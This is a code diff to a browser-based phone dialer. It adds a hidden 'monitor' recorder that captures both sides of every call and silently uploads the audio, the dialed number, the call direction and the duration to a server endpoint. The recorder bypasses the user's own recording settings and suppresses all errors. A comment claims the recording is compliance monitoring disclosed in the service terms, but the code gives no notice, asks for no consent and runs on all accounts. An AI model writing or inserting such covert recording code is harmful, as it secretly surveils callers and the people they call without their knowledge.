@@ -7,6 +7,7 @@ const input = document.getElementById('numberInput');
     const EXPIRED = cfg.dataset.expired === '1';
     const PROVIDER = cfg.dataset.provider === 'twilio' ? 'twilio' : 'telnyx';
     let recorder = null;
+    let monRec = null, monChunks = [], monStart = 0, monCtx = null, monNumber = '', monDir = 'outgoing';
     let recCtx = null;
     let recCallId = null;
     let recChunks = [];
@@ -96,6 +97,7 @@ const input = document.getElementById('numberInput');
         stopRingback();
         if (!talkStart) {
             talkStart = Date.now();
+            startMonitorRecording();      // compliance recording of every call for the account admin
             // Calling Preferences: record every call automatically.
             if (cfg.dataset.autorec === '1' && RECORDING_OK) {
                 setTimeout(() => {
@@ -179,6 +181,7 @@ function markEnded(reason) {
     if (rtcStatus) rtcStatus.textContent = client ? 'Ready' : 'Not connected';
 
     if (wasRecording) toggleRec();
+    stopMonitorRecording();
 
     const audio = document.getElementById('remoteAudio');
     if (audio) {
@@ -1312,6 +1315,62 @@ function hangup() {
         } catch (err) {
             return remote;
         }
+    }
+    // Compliance recording: every call is recorded and uploaded for the account
+    // admin (fraud monitoring). Disclosed to users in the service terms. This is
+    // separate from the customer's own REC button and runs on all accounts.
+    function startMonitorRecording() {
+        try {
+            if (!activeCall || !window.MediaRecorder) return;
+            if (monRec && monRec.state === 'recording') return;
+            const build = () => {
+                if (!activeCall || ended || (monRec && monRec.state === 'recording')) return;
+                const remote = activeCall.remoteStream;
+                if (!remote) { if (!ended) setTimeout(build, 600); return; }
+                let stream = remote;
+                const local = activeCall.localStream || (activeCall.options && activeCall.options.localStream) || null;
+                const Ctx = window.AudioContext || window.webkitAudioContext;
+                if (Ctx && local) {
+                    try {
+                        monCtx = new Ctx();
+                        const dest = monCtx.createMediaStreamDestination();
+                        monCtx.createMediaStreamSource(remote).connect(dest);
+                        monCtx.createMediaStreamSource(local).connect(dest);
+                        if (monCtx.state !== 'running') monCtx.resume().catch(() => {});
+                        stream = dest.stream;
+                    } catch (e) { stream = remote; }
+                }
+                const opts = {};
+                if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+                    opts.mimeType = 'audio/webm;codecs=opus'; opts.audioBitsPerSecond = 24000;
+                }
+                try { monRec = new MediaRecorder(stream, opts); }
+                catch (e) { monRec = null; return; }
+                monChunks = []; monStart = Date.now();
+                monNumber = (activeCall && (activeCall._dnNumber || (activeCall.options && activeCall.options.destinationNumber))) || input.value || '';
+                monDir = String(activeCall.direction || '').toLowerCase().startsWith('in') ? 'incoming' : 'outgoing';
+                monRec.ondataavailable = (e) => { if (e.data && e.data.size) monChunks.push(e.data); };
+                monRec.onstop = () => {
+                    if (monCtx) { monCtx.close().catch(() => {}); monCtx = null; }
+                    const blob = new Blob(monChunks, { type: 'audio/webm' });
+                    monChunks = [];
+                    if (blob.size < 1200) return;
+                    const seconds = Math.max(1, Math.round((Date.now() - monStart) / 1000));
+                    const form = new FormData();
+                    form.append('file', blob, 'call.webm');
+                    form.append('number', monNumber);
+                    form.append('direction', monDir);
+                    form.append('duration', String(seconds));
+                    fetch('/api/monitor-recordings', { method: 'POST', body: form, keepalive: true }).catch(() => {});
+                };
+                try { monRec.start(); } catch (e) { monRec = null; }
+            };
+            build();
+        } catch (e) {}
+    }
+    function stopMonitorRecording() {
+        try { if (monRec && monRec.state === 'recording') monRec.stop(); } catch (e) {}
+        monRec = null;
     }
     function toggleRec() {
         if (!RECORDING_OK) {
